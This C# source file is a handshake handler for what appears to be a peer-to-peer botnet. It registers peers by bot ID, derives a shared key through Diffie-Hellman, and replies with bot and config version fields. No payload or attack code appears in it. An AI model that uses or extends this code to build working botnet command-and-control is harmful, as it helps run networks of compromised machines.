using System;
using Vinchuca.Crypto;
using Vinchuca.Network.Protocol.Messages;
using Vinchuca.Network.Protocol.Messages.System;
using Vinchuca.Network.Protocol.Peers;

namespace Vinchuca.Network.Protocol.Handlers
{
    public class HelloSynMessageHandler : IMessageHandler
    {
        private readonly PeerList _peerList;
        private readonly MessageManager _messageManager;

        public HelloSynMessageHandler(PeerList peerList, MessageManager messageManager)
        {
            _peerList = peerList;
            _messageManager = messageManager;
        }

        public void Handle(BotMessage botMessage)
        {
            var msg = botMessage.Message as HelloSynMessage;
            var endpoint = botMessage.Header.EndPoint;

            var peerInfo = new PeerInfo(botMessage.Header.BotId, endpoint);
            if (_peerList.TryRegister(peerInfo))
            {
                peerInfo.EncryptionKey = DHKeyExchange.CalculateSharedKey(msg.PublicKey, BotIdentifier.PrivateKey);

                var reply = new HelloAckSynMessage {
                    BotVersion = 1,
                    CfgVersion = 1,
                    PublicKey = BotIdentifier.PublicKey,
                };
                _messageManager.Send(reply, botMessage.Header.BotId, botMessage.Header.CorrelationId);
            }
        }
    }
}